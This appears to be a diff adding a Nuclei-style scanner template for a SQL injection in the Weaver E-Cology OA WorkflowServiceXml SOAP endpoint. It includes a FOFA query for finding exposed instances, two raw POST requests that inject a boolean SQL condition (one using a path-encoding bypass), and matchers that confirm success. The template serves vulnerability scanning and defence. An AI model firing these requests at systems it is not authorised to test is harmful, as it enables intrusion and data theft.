@@ -1,0 +1,87 @@
+id: Weaver-E-Cology-WorkflowServiceXml-sql
+info:
+  name: "泛微E-Cology WorkflowServiceXml 接口SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="泛微-OA（e-cology）"
+    该漏洞存在于泛微OA E-Cology系统的/services/WorkflowServiceXml接口，攻击者可通过构造恶意SQL请求利用此缺陷获取数据库访问权限，最终导致敏感数据泄露。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140493841
+  tags: 泛微E-Cology
+
+
+
+http:
+- raw:
+  - |
+    POST /services/WorkflowServiceXml HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
+      <soapenv:Header/>
+        <soapenv:Body>
+          <web:getHendledWorkflowRequestList>
+            <web:in0>1</web:in0>
+            <web:in1>1</web:in1>
+            <web:in2>1</web:in2>
+            <web:in3>1</web:in3>
+            <web:in4>
+              <web:string>1=1 AND 2=2</web:string>
+            </web:in4>
+          </web:getHendledWorkflowRequestList>
+        </soapenv:Body>
+    </soapenv:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'WorkflowRequestInfo'
+    - 'workflowName'
+    - 'lastOperatorName'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+- raw:
+  - |
+    POST /services%20/WorkflowServiceXml HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
+      <soapenv:Header/>
+        <soapenv:Body>
+          <web:getHendledWorkflowRequestList>
+            <web:in0>1</web:in0>
+            <web:in1>1</web:in1>
+            <web:in2>1</web:in2>
+            <web:in3>1</web:in3>
+            <web:in4>
+              <web:string>1=1 AND 2=2</web:string>
+            </web:in4>
+          </web:getHendledWorkflowRequestList>
+        </soapenv:Body>
+    </soapenv:Envelope>
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'WorkflowRequestInfo'
+    - 'workflowName'
+    - 'lastOperatorName'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
